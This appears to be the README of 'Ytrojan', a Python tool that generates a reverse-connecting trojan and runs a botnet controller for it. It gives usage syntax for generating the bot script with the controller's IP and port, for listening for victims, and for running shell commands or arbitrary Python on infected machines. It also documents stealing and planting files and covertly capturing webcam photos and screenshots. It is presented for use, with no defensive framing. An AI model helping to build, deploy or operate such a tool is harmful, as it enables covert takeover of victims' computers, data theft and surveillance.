# Ytrojan

`Ytrojan` is a troj generator based on the C/S structure in the TCP protocal, where the controller is treated as the **server** and the controlled terminal is treated as the **client**.

## How to use Ytrojan

Use a Python intepreter (`>=3.10`) to run `Main-Cmd.py`.

Result:
```
 __   ___             _             
 \ \ / / |_ _ __ ___ (_) __ _ _ __  
  \ V /| __| '__/ _ \| |/ _` | '_ \ 
   | | | |_| | | (_) | | (_| | | | |
   |_|  \__|_|  \___// |\__,_|_| |_|
                   |__/                         
                                      
Ytrojan $>
```  

### Use the command `generate` to generate the controlled script

```
Function Prototype: YtrojyanAPI.Generate(BotSrc,BotIp,BotPort)
Command:            generate [PATH] [IP] [PORT]
1. [PATH] is the path to the controlled script
          e.g. : D:\bot.py  /home/bot.py
2. [IP]   is the IP address of the controller
3. [PORT] is the port number of the controller
```

### Use the command `listen` to open the controller's port and wait for the connection from the controlled terminal of the reversed troj

```
Function Prototype: YtrojyanAPI.Listen(ControlPort)
Command:            listen [ControlPort]

1. [ControlPort] is the controller.
```  

### How to operate on the target
Use command `botnet` to list all controlled terminals.  
The command `botnet` will list all connected terminals, each in the following format:
```
[NO] | [OS_NAME] [NETWORK_NAME] [CPU_ARCH] [IP]
```
where

| Placeholder       | Meaning                                       |
|-------------------|-----------------------------------------------|
| `[NO]`            | The id number of the terminal.                |
| `[OS_NAME]`       | The type of its OS.(`posix` or `nt`)          |
| `[NETWORK_NAME]`  | Its name in the network.                      |
| `[CPU_ARCH]`      | The architecture of the CPU.                  |
| `[IP]`            | The IP of the controlled terminal.            |

Use command `run` to execute commands on the controlled terminal.

```
Function Prototype:      YtrojanAPI.Run(BotSocket, Command)
Command:                 run [no_of_terminal] [command]
                         where [command] could be one of the following:
                             1. shell [SHELL_COMMAND]
                                e.g. run 0 shell ls
                                     (execute the shell command ls at the connected terminal 0)
                             2. pycode [PythonCode]
                                Execute python code on the controlled terminal.
                                e.g. run 0 pycode import tkinter;w = tkinter.Tk();w.mainloop()
                             3. getfile [dist_path] [src_path]
                                Download file from the controlled terminal, where
                                    [dist_path] is the path on the controller terminal to save the downloaded file.
                                    [src_path]  is the path on the controlled terminal to the file that will be downloaded.
                             4. putfile [dist_path] [src_path]
                                Save the file at the [src_path] on the controller terminal to the file at the [dist_path] on the controlled terminal.
                             5. webcamsnap [path]
                                Use the controlled terminal's WebCam to take a photo and save it to the path on the controller terminal.
                             6. screenshot [path]
                                Get a screenshot from the controlled terminal and save to the [path] on the controller terminal.
```

